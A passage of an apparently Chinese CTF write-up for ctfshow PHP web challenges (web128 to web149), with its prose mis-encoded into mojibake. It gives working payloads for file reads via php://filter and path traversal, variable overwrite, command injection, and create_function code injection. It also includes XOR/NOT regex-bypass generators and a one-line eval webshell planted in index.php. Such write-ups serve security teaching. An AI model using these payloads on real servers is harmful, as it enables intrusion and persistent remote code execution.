class="string">&#x27;/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\&#123;|\;|\:|\[|\]|\&#125;|\&#x27;|\&quot;|\&lt;|\,|\&gt;|\.|\\\|\//&#x27;</span>, <span class="variable">$url</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">waf</span>(<span class="variable">$url</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;å—¯å“¼ï¼Ÿ&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctf_show</span>===<span class="string">&#x27;ilove36d&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å°çŸ¥è¯†ç‚¹ï¼š _()æ˜¯ä¸€ä¸ªå‡½æ•°</p><p>_()&#x3D;&#x3D;gettext() æ˜¯gettext()çš„æ‹“å±•å‡½æ•°ï¼Œå¼€å¯textæ‰©å±•ã€‚éœ€è¦phpæ‰©å±•ç›®å½•ä¸‹æœ‰php_gettext.dll</p><p>get_defined_vars()å‡½æ•°</p><p>get_defined_vars â€” è¿”å›ç”±æ‰€æœ‰å·²å®šä¹‰å˜é‡æ‰€ç»„æˆçš„æ•°ç»„ è¿™æ ·å¯ä»¥è·å¾— $flag</p><p>payload: ?f1&#x3D;_&amp;f2&#x3D;get_defined_vars</p><h4><span id="web129">web129</span></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-10-13 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-10-13 03:18:40</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$f</span>, <span class="string">&#x27;ctfshow&#x27;</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">readfile</span>(<span class="variable">$f</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™é¢˜æ˜¯è®©æˆ‘ä»¬è¯»å–flag,å½“æ—¶æˆ‘ä»¬ä¼ å…¥çš„å€¼å¿…é¡»åŒ…æ‹¬ctfshowè€Œä¸”ä¸èƒ½å‡ºç°åœ¨å¼€å¤´,ç¬¬ä¸€ååº”å°±æ˜¯ç”¨filterä¼ªåè®®è¯»å–,ä¸­é—´æŠŠctfshowæ›¿æ¢æˆè¿‡æ»¤å™¨çš„åç§°<code>php://filter/ctfshow/resource=flag.php</code>,æˆ–è€…ç›®å½•éå†ä¹Ÿå¯ä»¥</p><ul><li><p>æ–¹æ³•ä¸€ï¼šfilter</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?f=php:<span class="comment">//filter/read=convert.base64-encode|ctfshow/resource=flag.php</span></span><br><span class="line">?f=php:<span class="comment">//filter/|ctfshow/resource=flag.php</span></span><br><span class="line">?f=php:<span class="comment">//filter/ctfshow/resource=flag.php</span></span><br><span class="line">å…·ä½“åŸç†ä¹Ÿä¸æ˜¯å¾ˆæ¸…æ¥š,å¯èƒ½æ˜¯phpé‡åˆ°æ²¡æœ‰çš„filterå°±ä¼šå¿½ç•¥</span><br></pre></td></tr></table></figure></li><li><p>æ–¹æ³•äºŒï¼šç›®å½•ç»•è¿‡</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?f=/ctfshow/../../../../var/www/html/flag.php</span><br><span class="line">?f=./ctfshow/../flag.php</span><br></pre></td></tr></table></figure></li></ul><h4><span id="web131">web131</span></h4><p><a href="https://www.laruence.com/2010/06/08/1579.html">æ­£åˆ™æœ€å¤§å›æº¯</a></p><h4><span id="web134">web134</span></h4><p>è§£ç­”ï¼šçœ‹åˆ°parse_strå’Œextractã€‚å˜é‡è¦†ç›–<br>ç¬¬ä¸€æ¡ifåˆ¤æ–­ï¼Œè¦æ±‚key1å’Œkey2ä¸èƒ½é€šè¿‡getå’Œpostä¼ é€’ã€‚</p><p>parse_stræ˜¯å¯¹getè¯·æ±‚è¿›è¡Œçš„å†…å®¹è§£ææˆå˜é‡ã€‚ä¾‹å¦‚ä¼ é€’?a&#x3D;1ï¼Œæ‰§è¡Œåå°±æ˜¯$a&#x3D;1ã€‚<br>é‚£ä¹ˆç›¸å¯¹çš„ï¼Œä¼ é€’_POSTï¼Œå°±æ˜¯å¯¹$_POSTè¿›è¡Œèµ‹å€¼ï¼Œæ­£å¥½å°±å¯ä»¥ç»•è¿‡ifæ¡ä»¶å¯¹postçš„é™åˆ¶ã€‚<br>extract() å‡½æ•°ä»æ•°ç»„ä¸­å°†å˜é‡å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨ã€‚</p><p><code>payloadï¼š?_POST[key1]=36d&amp;_POST[key2]=36d</code></p><h4><span id="web136">web136</span></h4><p><code>tee</code>ç”¨äºæ˜¾ç¤ºç¨‹åºçš„è¾“å‡ºå¹¶å°†å…¶å¤åˆ¶åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­ã€‚</p><p><strong>payload</strong>ï¼š<code>?c=ls |tee 1</code>ï¼Œè®¿é—®1å‘ç°å½“å‰ç›®å½•æ²¡æœ‰flagæ–‡ä»¶ã€‚</p><p><code>?c=ls / |tee 1</code>ï¼Œå‘ç°f149_15_h3r3æ–‡ä»¶ã€‚</p><p><code>?c=cat /f149_15_h3r3|tee 1</code>è·å–flagã€‚</p><h4><span id="web141">web141</span></h4><p>æ•°å­—å’Œè¿ç®—ç¬¦æ˜¯å¯ä»¥ä¸€èµ·æ‰§è¡Œå‘½ä»¤çš„ï¼Œå¦‚1+phpinfo()+1;æ˜¯å¯ä»¥æ˜¾ç¤ºphpinfoé¡µé¢çš„ï¼ŒGETä¼ å…¥çš„åªæ˜¯å­—ç¬¦ä¸²â€œ1+phpinfo()+1â€;æ˜¯ä¸èƒ½ç›´æ¥æ‰§è¡Œå‘½ä»¤çš„ï¼Œç»è¿‡evalå¤„ç†åå°±å˜æˆäº†å¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼Œif(preg_match(â€˜&#x2F;^\W+$&#x2F;â€˜, $v3)){çš„å­˜åœ¨æˆ‘ä»¬åªèƒ½ä¼ å…¥éæ•°å­—å­—æ¯ï¼Œä¸è¿‡php7å¯ä»¥ç”¨ï¼ˆâ€˜phpinfoâ€™)()åŠ¨æ€è°ƒç”¨å‡½æ•°ï¼Œå¯ä»¥ç”¨å¼‚æˆ–ç»•è¿‡</p><p>éœ€è¦é€šè¿‡è„šæœ¬ç»•è¿‡</p><p><a href="https://blog.csdn.net/miuzzx/article/details/109143413">phpè„šæœ¬</a></p><p>v1&#x3D;1&amp;v2&#x3D;1&amp;v3&#x3D;%2bï¼ˆ+å·ï¼‰æˆ–è€…%2dï¼ˆ-å·ï¼‰åŠ ä¸Šè„šæœ¬ç¼–ç åçš„å­—ç¬¦ä¸²ã€‚</p><ul><li><p><strong>å–å</strong></p><p>å› ä¸ºå–åçš„è¯ï¼ŒåŸºæœ¬ä¸Šç”¨çš„éƒ½æ˜¯ä¸€ä¸ªä¸å¯è§å­—ç¬¦ï¼Œæ‰€ä»¥ä¸ä¼šè§¦å‘åˆ°æ­£åˆ™è¡¨è¾¾å¼</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//åœ¨å‘½ä»¤è¡Œä¸­è¿è¡Œ</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*author yu22x*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(STDOUT,<span class="string">&#x27;[+]your function: &#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$system</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">fgets</span>(STDIN)); </span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(STDOUT,<span class="string">&#x27;[+]your command: &#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$command</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">fgets</span>(STDIN)); </span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;[*] (~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$system</span>).<span class="string">&#x27;)(~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$command</span>).<span class="string">&#x27;);&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li><p>å¼‚æˆ–å’Œæˆ–æ“ä½œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    @Author disda</span></span><br><span class="line"><span class="string">    @Date 2023/5/16 10:23</span></span><br><span class="line"><span class="string">    @Describe </span></span><br><span class="line"><span class="string">    @Dependency</span></span><br><span class="line"><span class="string">    @Version 1.0</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    @Author disda</span></span><br><span class="line"><span class="string">    @Date 2023/4/26 18:56</span></span><br><span class="line"><span class="string">    @Describe</span></span><br><span class="line"><span class="string">    @Dependency</span></span><br><span class="line"><span class="string">    @Version 1.0</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"></span><br><span class="line">op_dict = &#123;</span><br><span class="line">    <span class="string">&quot;yes_op&quot;</span>: <span class="keyword">lambda</span> x: x,</span><br><span class="line">    <span class="string">&quot;not_op&quot;</span>: <span class="keyword">lambda</span> x: <span class="keyword">not</span> x,</span><br><span class="line">    <span class="string">&quot;or_op&quot;</span>: <span class="keyword">lambda</span> x, y: x | y,</span><br><span class="line">    <span class="string">&quot;xor_op&quot;</span>: <span class="keyword">lambda</span> x, y: x ^ y</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sign = &#123;</span><br><span class="line">    <span class="string">&#x27;xor_op&#x27;</span>: <span class="string">&#x27;^&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;or_op&#x27;</span>:<span class="string">&#x27;|&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_coding</span>(<span class="params">file_name, pattern, is_match, mode</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    ç”Ÿæˆç¬¦åˆè¦æ±‚çš„ç¼–ç </span></span><br><span class="line"><span class="string">    @param file_name: ç”Ÿæˆæ–‡ä»¶çš„åç§°</span></span><br><span class="line"><span class="string">    @param pattern: æ­£åˆ™è¡¨è¾¾å¼</span></span><br><span class="line"><span class="string">    @param is_match: æ˜¯å¦åŒ¹é…æ­£åˆ™ï¼ŒTrueè¡¨ç¤ºåŒ¹é…ï¼ŒFalseè¡¨ç¤ºä¸åŒ¹é…</span></span><br><span class="line"><span class="string">    @param mode: ç¼–ç æ–¹å¼</span></span><br><span class="line"><span class="string">    @return:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_name, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">                op = op_dict[<span class="string">&#x27;not_op&#x27;</span>] <span class="keyword">if</span> is_match <span class="keyword">else</span> op_dict[<span class="string">&#x27;yes_op&#x27;</span>]</span><br><span class="line"></span><br><span class="line">                <span class="comment"># å¦‚æœå½“å‰å¤–å±‚å¾ªç¯å…ƒç´ è¢«è¿‡æ»¤äº†ï¼Œç›´æ¥è·³è¿‡æ‰€æœ‰å†…å±‚å¾ªç¯</span></span><br><span class="line">                <span class="keyword">if</span> op(re.search(pattern, <span class="built_in">chr</span>(i))):</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="comment"># å¦‚æœå½“å‰å†…å±‚å¾ªç¯å…ƒç´ è¢«è¿‡æ»¤äº†ï¼Œè·³è¿‡è¯¥å…ƒç´ </span></span><br><span class="line">                <span class="keyword">if</span> op(re.search(pattern, <span class="built_in">chr</span>(j))):</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">                <span class="comment"># [2:]æ˜¯å› ä¸ºpythonä¸­hexè¡¨ç¤ºæ˜¯0xffè¿™æ ·çš„å½¢å¼ï¼Œå»æ‰å‰é¢çš„0xï¼Œç»„æˆ2ä½urlç¼–ç </span></span><br><span class="line">                hex_i = <span class="string">&quot;0&quot;</span> + <span class="built_in">hex</span>(i)[<span class="number">2</span>:] <span class="keyword">if</span> i &lt; <span class="number">16</span> <span class="keyword">else</span> <span class="built_in">hex</span>(i)[<span class="number">2</span>:]</span><br><span class="line">                hex_j = <span class="string">&quot;0&quot;</span> + <span class="built_in">hex</span>(j)[<span class="number">2</span>:] <span class="keyword">if</span> j &lt; <span class="number">16</span> <span class="keyword">else</span> <span class="built_in">hex</span>(j)[<span class="number">2</span>:]</span><br><span class="line">                <span class="comment"># urlç¼–ç çš„æ–¹å¼å’ŒASCIIç ä¸€æ ·ï¼Œä½†éœ€è¦åœ¨å‰é¢åŠ ä¸Š%</span></span><br><span class="line">                url_i = <span class="string">&#x27;%&#x27;</span> + hex_i</span><br><span class="line">                url_j = <span class="string">&#x27;%&#x27;</span> + hex_j</span><br><span class="line">                <span class="comment"># cæ˜¯æˆ‘ä»¬è¦æ„é€ çš„å‚æ•°ï¼Œæ¯”å¦‚è¯´æˆ‘ä»¬è¦ä¼ lså‘½ä»¤ï¼Œlå°±è¦æ‹†åˆ†æˆa|bï¼Œå…¶ä¸­|æ˜¯å› ä¸ºé¢˜ç›®æ²¡æœ‰è¿‡æ»¤|ï¼Œæˆ‘ä»¬å¯ä»¥ä¿®æ”¹æˆå…¶ä»–ä»»æ„æ“ä½œå¦‚^</span></span><br><span class="line">                c = op_dict[mode](<span class="built_in">ord</span>(urllib.parse.unquote(url_i)), <span class="built_in">ord</span>(urllib.parse.unquote(url_j)))</span><br><span class="line">                <span class="comment"># å¦‚æœcæ˜¯å¯è§çš„å­—ç¬¦</span></span><br><span class="line">                <span class="keyword">if</span> c &gt;= <span class="number">32</span> <span class="keyword">and</span> c &lt;= <span class="number">126</span>:</span><br><span class="line">                    f.write(<span class="built_in">chr</span>(c) + <span class="string">&quot; &quot;</span> + url_i + <span class="string">&quot; &quot;</span> + url_j + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg,file_name,mode</span>):</span><br><span class="line">    s1 = <span class="string">&quot;&quot;</span></span><br><span class="line">    s2 = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">        f = <span class="built_in">open</span>(file_name, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            t = f.readline()</span><br><span class="line">            <span class="keyword">if</span> t == <span class="string">&quot;&quot;</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> t[<span class="number">0</span>] == i:</span><br><span class="line">                s1 += t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">                s2 += t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        f.close()</span><br><span class="line">    output = <span class="string">&quot;(\&quot;&quot;</span> + s1 + <span class="string">&quot;\&quot;&quot;</span>+sign[mode]+<span class="string">&quot;\&quot;&quot;</span> + s2 + <span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">    <span class="keyword">return</span> (output)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;rce.txt&#x27;</span></span><br><span class="line">mode = <span class="string">&#x27;xor_op&#x27;</span></span><br><span class="line">reg = <span class="string">&#x27;^\W+$&#x27;</span></span><br><span class="line">generate_coding(file_name,reg,<span class="literal">True</span>,mode)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    param = action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your functionï¼š&quot;</span>),file_name,mode) + action(<span class="built_in">input</span>(<span class="string">&quot;[+] your commandï¼š&quot;</span>),file_name,mode) + <span class="string">&quot;;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(param)</span><br></pre></td></tr></table></figure></li></ul><h4><span id="web147">web147</span></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z0-9_]*$/isD&#x27;</span>,<span class="variable">$ctfshow</span>)) &#123;</span><br><span class="line">        <span class="variable">$ctfshow</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;show&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è€ƒå¯Ÿç‚¹ï¼šcreate_function()ä»£ç æ³¨å…¥</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$a&#x27;</span>,<span class="string">&#x27;echo $a.&quot;123&quot;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç±»ä¼¼</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"><span class="variable">$a</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$a</span>.<span class="string">&quot;123&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆå¦‚æœæˆ‘ä»¬ç¬¬äºŒä¸ªå‚æ•°ä¼ å…¥ echo 1;}phpinfo(); ç­‰ä»·äºæ‰§è¡Œåé¢çš„å‘½ä»¤</p><p><strong>åœ¨PHPçš„å‘½åç©ºé—´é»˜è®¤ä¸º<code>\</code>ï¼Œæ‰€æœ‰çš„å‡½æ•°å’Œç±»éƒ½åœ¨<code>\</code>è¿™ä¸ªå‘½åç©ºé—´ä¸­ï¼Œå¦‚æœç›´æ¥å†™å‡½æ•°åfunction_name()è°ƒç”¨ï¼Œè°ƒç”¨çš„æ—¶å€™å…¶å®ç›¸å½“äºå†™äº†ä¸€ä¸ªç›¸å¯¹è·¯å¾„ï¼›è€Œå¦‚æœå†™\function_name() è¿™æ ·è°ƒç”¨å‡½æ•°ï¼Œåˆ™å…¶å®æ˜¯å†™äº†ä¸€ä¸ªç»å¯¹è·¯å¾„ã€‚å¦‚æœä½ åœ¨å…¶ä»–namespaceé‡Œè°ƒç”¨ç³»ç»Ÿç±»ï¼Œå°±å¿…é¡»å†™ç»å¯¹è·¯å¾„è¿™ç§å†™æ³•ã€‚</strong></p><p>%5cå°±æ˜¯\çš„urlç¼–ç ï¼Œç›´æ¥å†™æ–œæ èƒ½è¿‡</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">get: <span class="title">show</span>=<span class="title">echo</span> 123;&#125;<span class="title">system</span>(&#x27;<span class="title">tac</span> <span class="title">f</span>*&#x27;);//</span></span><br><span class="line"><span class="function"># <span class="title">or</span></span></span><br><span class="line"><span class="function"><span class="title">get</span>: <span class="title">show</span>=<span class="title">echo</span> 123;&#125;<span class="title">system</span>(&#x27;<span class="title">tac</span> <span class="title">f</span>*&#x27;);/*</span></span><br><span class="line"><span class="function"><span class="title">post</span>: <span class="title">ctf</span>=\<span class="title">create_function</span></span></span><br></pre></td></tr></table></figure><h4><span id="web149">web149</span></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$files</span> = <span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctf&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;show&#x27;</span>]);</span><br><span class="line"> </span><br><span class="line"><span class="variable">$files</span> = <span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><ul><li><p>æ€è·¯ä¸€ï¼šå†™å…¥index.phpä¸€å¥è¯æœ¨é©¬</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">get: <span class="title">ctf</span>=<span class="title">index.php</span></span></span><br><span class="line"><span class="function"><span class="title">post</span>: <span class="title">show</span>=&lt;?<span class="title">php</span> <span class="title">phpinfo</span>();<span class="title">eval</span>($<span class="title">_POST</span>[0]);?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>æ€è·¯äºŒï¼šæ¡ä»¶ç«äº‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span 